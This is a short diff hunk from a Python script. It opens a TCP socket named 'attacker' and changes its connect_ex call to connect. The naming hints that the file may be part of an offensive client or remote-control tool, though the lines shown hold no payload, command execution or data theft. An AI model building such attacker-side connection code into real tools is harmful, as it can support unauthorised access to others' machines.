@@ -7,7 +7,7 @@ FORMAT = 'utf-8'
 ADDR = (SERVER, PORT)
 
 attacker = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connect = attacker.connect_ex(ADDR)
+attacker.connect(ADDR)
 
 
 def append_text(text):
